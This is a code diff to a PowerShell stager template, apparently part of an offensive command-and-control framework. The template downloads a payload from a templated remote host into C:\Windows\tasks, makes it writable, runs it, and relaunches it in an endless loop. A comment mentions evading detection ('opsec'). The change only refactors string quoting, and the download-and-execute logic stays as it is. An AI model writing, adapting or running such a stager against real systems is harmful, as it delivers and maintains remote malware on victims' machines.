@@ -1,11 +1,11 @@
 $path = "C:\Windows\tasks"
 $wc = New-Object net.webclient
-$wc.Downloadfile("{{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}", "$path\{{.Name}}")
-$baseFileName = "{{.Name}}"
-$fullPath = "$path\{{.Name}}"
+$baseFileName = {{psq .Name}}
+$fullPath = Join-Path $path $baseFileName
+$wc.Downloadfile({{psq (printf "%s://%s:%s/%s" .Protocol .Host .Port .Name)}}, $fullPath)
 $processName = [System.IO.Path]::GetFileNameWithoutExtension($baseFileName)
-Set-ItemProperty -Path "$path\{{.Name}}" -Name IsReadOnly -Value $false
-Start-Process -Filepath "$path\{{.Name}}"
+Set-ItemProperty -Path $fullPath -Name IsReadOnly -Value $false
+Start-Process -Filepath $fullPath
 # poor mans fileless and arguable not very opsec friendly...
 while ($true) {
     $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
@@ -17,4 +17,3 @@ while ($true) {
     }
     Start-Sleep -Seconds 5
 }
-
